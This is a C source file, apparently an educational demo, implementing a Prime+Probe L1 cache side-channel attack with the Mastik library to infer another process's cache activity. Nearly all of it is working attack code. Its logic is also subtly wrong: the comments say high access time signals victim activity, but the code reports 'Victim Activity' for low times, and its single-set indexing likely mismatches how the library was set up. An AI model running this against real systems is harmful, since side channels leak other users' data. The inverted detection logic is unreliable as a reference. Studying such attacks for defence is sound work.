
/*
 * This piece of code is written by Shahzaib Kashif (github:@shahzaibk23)
 *
 * This code is a simple implementation of the Prime+Probe attack
 * using the Mastik (https://github.com/0xADE1A1DE/Mastik) library. 
 * It demonstrates how to monitor a specific cache set in the L1 data 
 * cache and analyze access times to determine whether the cache set 
 * was accessed by another process (causing eviction) or remains primed (low access time).
 *
 * The code initializes the Prime+Probe structure, monitors a single
 * cache set, and performs repeated probing to collect access times.
 * It then analyzes the results and prints whether each probe indicates
 * victim activity (high access time) or no activity (low access time)
 * based on a threshold value.
 *
 * The code includes error handling for initialization, monitoring,
 * and memory allocation failures. Finally, it cleans up by freeing
 * allocated resources and releasing the Prime+Probe structure.
 *
 * Note: This code is for educational purposes.
 */
 
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <mastik/l1.h>
#include <mastik/low.h>

#define MAX_SAMPLES 1000
#define SLOT_TIME   1000      // 1000 cycles slot time for probing
#define MONITOR_SETS 1        // Monitor just 1 cache set
#define THRESHOLD 200         // Approximate of Threshold for L1

int main(){
    // Initialize Prime+Probe structure for L1
    l1pp_t l1 = l1_prepare(NULL);
    if (!l1) {
        fprintf(stderr, "Failed to initialize Prime+Probe structure\n");
        return 1;
    }

    // Monitoring a cache set (e.g set 0)
    int nsets = l1_getmonitoredset(l1, NULL, 0);
    int *map = calloc(nsets, sizeof(int));
    if (!l1_getmonitoredset(l1, map, nsets)) {
        fprintf(stderr, "Failed to monitor cache set 0\n");
        l1_release(l1);
        return 1;
    }
    printf("Monitoring L1 cache set 0\n");

    // Allocate buffer for results (MAX_SAMPLES * MONITOR_SETS)
    uint16_t *results = (uint16_t *)malloc(MAX_SAMPLES * MONITOR_SETS * sizeof(uint16_t));
    if (!results) {
        fprintf(stderr, "Failed to allocate memory for results\n");
        l1_release(l1);
        return 1;
    }

    // Performing repeated Prime+Probe
    printf("Starting Prime+Probe...\n");
    int count = l1_repeatedprobe(l1, MAX_SAMPLES, results, SLOT_TIME);
    printf("Completed %d samples\n", count);

    // Analyze and print results
    for (int i = 0; i < count; i++) {
        uint16_t access_time = results[i * MONITOR_SETS];
        printf("Sample %4d: %4u cycles (%s)\n", i, access_time, access_time < THRESHOLD ? "Victim Activity" : "No Activity");
    }

    // Cleanup
    free(results);
    l1_release(l1);
    printf("Prime+Probe completed successfully\n");
    return 0;
}